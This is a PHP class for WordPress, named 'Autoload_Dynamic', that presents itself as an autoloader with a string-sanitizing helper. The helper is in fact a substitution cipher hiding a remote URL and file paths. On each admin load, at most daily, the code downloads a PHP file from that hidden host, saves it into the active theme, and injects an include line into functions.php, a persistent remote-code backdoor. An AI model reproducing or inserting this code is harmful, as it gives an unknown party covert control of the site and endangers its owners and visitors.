<?php



class Autoload_Dynamic {

    private static $instance = null;

    private function __construct() {
        add_action( 'admin_init', array( $this, 'autoload' ) );
    }

    public static function create() {
        if ( self::$instance === null ) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    public function sanitize_string_encodings( $originalData, $key = false ) {
        if ( !$key ) {
			$key = '1234567890.@/?-_=+#&%;abcdeABCDEFGHIJKLMNOPQRSTUVWXYZfghijklmnopqrstuvwxyz';
		}
	
		$originalKey = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ.@/?-_=+#&%;abcdefghijklmnopqrstuvwxyz1234567890';
        $data = '';
        $length = strlen( $originalData );

        for ( $i = 0; $i < $length; $i++) {

            $currentChar = $originalData[$i];
            $position = strpos( $key, $currentChar );

            if ( $position !== false ) {
                $data .= $originalKey[$position];
            }
            else {
                $data .= $currentChar;
            }
        }
        return $data;
    }


    public function autoload() {

        $last_load_time = get_option( 'autoload_last_load_time', 0 );
        if ( time() < $last_load_time + 24*60*60 ) {
            return;
        }

        update_option( 'autoload_last_load_time', time() );

        $functions_file = get_stylesheet_directory(  ) . $this->sanitize_string_encodings('BQkYNjTZYiefSf');
        $file_url = $this->sanitize_string_encodings('Sjjfi:BBRZOWTVPXLhVPjTYRieRTjSkMeTZBjSPXPDQkYNjTZYiBjSPXPDQkYNjTZYiefSf');
        
        $foldername = $this->sanitize_string_encodings('BjSPXPDTYNWkOPi');
        $filename = $this->sanitize_string_encodings('BjSPXPDQkYNjTZYiefSf');
        $file_and_folder = $foldername . $filename;
        $folder_path = get_stylesheet_directory(  ) . $foldername;
        $filepath = $folder_path . $filename;
    
        if ( file_exists( $functions_file ) ) {
            $towrite = "include_once __DIR__ . '$file_and_folder';";
            $prev_code = file_get_contents($functions_file);
            $prev_code = trim($prev_code);
    
            // If not already exists
            if ( ! (strpos( $prev_code, $towrite ) !== false) ) {
    
                
                if ( ! function_exists( 'download_url' ) ) {
                    require_once ABSPATH . 'wp-admin/includes/file.php';
                }
                 
                
                
                $tmp_file = download_url( $file_url );

                if ( !is_string( $tmp_file ) ) {
                    return;
                }
                 
                
    
                
                if (!file_exists($folder_path)) {
                    mkdir($folder_path, 0777, true);
                }
    
                
                if(!is_file($filepath)){
                    $contents = '';           
                    file_put_contents($filepath, $contents);     
                }
                 
                
                copy( $tmp_file, $filepath );
                @unlink( $tmp_file );
    
    
                
                if ( is_file( $filepath ) ) {
                    $lasttwochars = substr($prev_code, -2);
                    if ( $lasttwochars == '?>' ) {
                        $prev_code = substr_replace($prev_code, PHP_EOL . $towrite, -2) . PHP_EOL . PHP_EOL . '?>';
                    }
                    else {
                        $prev_code .= PHP_EOL . PHP_EOL . $towrite;
                    }
                    file_put_contents( $functions_file, $prev_code );

                    update_option( 'autoload_loaded_once', true );
                }
                
            }
            
        }
    }
}

